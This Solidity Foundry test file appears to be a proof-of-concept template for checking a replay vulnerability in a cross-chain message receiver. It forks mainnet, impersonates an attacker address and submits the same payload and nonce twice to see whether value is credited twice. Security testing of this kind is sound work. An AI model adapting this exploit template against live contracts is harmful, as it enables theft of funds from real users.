// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.20;

/*
    Replay attack template -- same packet/message replayed to drain duplicate value.

    Use when an alert shows the same `topic1` (message id) seen on multiple
    blocks/chains for an in-scope contract.

    FILL: TARGET, ATTACKER, FORK_BLOCK, MESSAGE_PAYLOAD, NONCE
*/

import "forge-std/Test.sol";

interface ITarget {
    // FILL: replace with the real target ABI (e.g. ILayerZeroEndpoint.receivePayload)
    function receivePayload(
        uint16 _srcChainId,
        bytes calldata _srcAddress,
        address _dstAddress,
        uint64 _nonce,
        uint256 _gasLimit,
        bytes calldata _payload
    ) external;
    function balanceOf(address) external view returns (uint256);
}

contract ReplayExploit is Test {
    // FILL: addresses + block
    address constant TARGET   = address(0x4D73AdB72bC3DD368966edD0f0b2148401A178E2); // FILL: actual target
    address constant ATTACKER = address(0xDeadBeeF00000000000000000000000000001337); // FILL: attacker EOA
    uint256 constant FORK_BLOCK = 22487000; // FILL: block BEFORE first replay
    uint64  constant NONCE      = 1;        // FILL: nonce used in original message

    // FILL: source-chain id + source-address used in the legitimate message
    uint16 constant SRC_CHAIN_ID = 101;
    bytes  constant SRC_ADDRESS = hex"00000000000000000000000000000000deadbeef";
    bytes  constant PAYLOAD     = hex""; // FILL: original message payload

    function setUp() public {
        string memory rpc = vm.envOr("FOUNDRY_RPC_URL", string("https://eth.llamarpc.com"));
        vm.createSelectFork(rpc, FORK_BLOCK);
    }

    function test_replayDuplicatesValue() public {
        uint256 attackerBefore = ITarget(TARGET).balanceOf(ATTACKER);

        // Step 1: deliver the original packet
        vm.prank(ATTACKER);
        try ITarget(TARGET).receivePayload(
            SRC_CHAIN_ID, SRC_ADDRESS, ATTACKER, NONCE, 200_000, PAYLOAD
        ) {} catch {
            revert("Cannot construct PoC: original packet delivery reverted");
        }

        // Step 2: REPLAY the same packet -- should fail if replay-protection works
        vm.prank(ATTACKER);
        ITarget(TARGET).receivePayload(
            SRC_CHAIN_ID, SRC_ADDRESS, ATTACKER, NONCE, 200_000, PAYLOAD
        );

        uint256 attackerAfter = ITarget(TARGET).balanceOf(ATTACKER);

        // Pass = exploit reproduces (attacker received value twice).
        // Fail = replay protection holds; finding is invalid.
        assertGt(attackerAfter, attackerBefore + 1,
                 "Replay protection held; cannot drain via duplicate delivery");
    }
}
